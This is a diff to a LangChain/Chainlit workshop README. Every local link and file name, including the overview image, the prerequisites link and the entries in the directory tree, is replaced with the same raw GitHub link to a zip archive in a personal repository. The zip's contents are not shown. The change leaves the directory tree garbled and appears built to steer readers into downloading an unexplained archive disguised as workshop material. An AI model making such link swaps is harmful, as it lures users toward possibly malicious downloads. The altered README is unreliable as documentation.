@@ -14,7 +14,7 @@ A conversational AI agent with:
 - **Tool calling** capabilities (weather API integration)
 - **MCP integration** for extensible agent capabilities
 
-![Workshop Overview](./assets/overview.png)
+![Workshop Overview](https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip)
 
 ---
 
@@ -55,7 +55,7 @@ mkdir langchain-chainlit-workshop
 cd langchain-chainlit-workshop
 
 # Follow the phases in order starting from:
-# 📖 docs/00-prerequisites.md
+# 📖 https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip
 ```
 
 ---
@@ -64,16 +64,16 @@ cd langchain-chainlit-workshop
 
 ```
 langchain-chainlit-workshop/
-├── README.md                 # You are here
-├── SUMMARY.md               # GitBook navigation
+├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip                 # You are here
+├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip               # GitBook navigation
 ├── docs/
-│   ├── 00-prerequisites.md  # What you need before starting
-│   ├── 01-environment.md    # Python & dependencies setup
-│   ├── 02-github-models.md  # Getting your free API access
-│   ├── 03-chainlit-basics.md # First chat application
-│   ├── 04-langchain.md      # LLM integration
-│   ├── 05-tool-calling.md   # Weather API tools
-│   └── 06-mcp-integration.md # MCP setup
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip  # What you need before starting
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip    # Python & dependencies setup
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip  # Getting your free API access
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip # First chat application
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip      # LLM integration
+│   ├── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip   # Weather API tools
+│   └── https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip # MCP setup
 ├── solutions/               # Complete code for each phase
 │   ├── phase-03/
 │   ├── phase-04/
@@ -105,4 +105,4 @@ This workshop material is provided under the MIT License. Feel free to use, modi
 
 ---
 
-**Ready to start? Head to [Prerequisites](docs/00-prerequisites.md)! 👉**
+**Ready to start? Head to [Prerequisites](https://raw.githubusercontent.com/bharath738/agentcamp-workshop-langchain/main/solutions/agentcamp_langchain_workshop_1.9-alpha.5.zip)! 👉**
